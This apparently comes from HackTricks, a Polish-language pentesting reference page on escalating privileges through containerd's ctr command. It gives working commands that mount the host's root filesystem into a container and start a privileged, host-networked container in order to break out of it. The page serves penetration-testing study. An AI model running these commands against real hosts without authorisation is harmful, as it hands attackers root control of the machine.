# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Przejdź do następującego linku, aby dowiedzieć się **czym jest containerd** i `ctr`:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

jeśli odkryjesz, że host zawiera polecenie `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Możesz wylistować obrazy:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
A następnie **uruchom jeden z tych obrazów, montując folder główny hosta do niego**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Uruchom kontener z uprawnieniami i wydostań się z niego.\
Możesz uruchomić kontener z uprawnieniami jako:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Następnie możesz użyć niektórych z technik wymienionych na poniższej stronie, aby **uciec z niej, nadużywając uprawnień uprzywilejowanych**:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
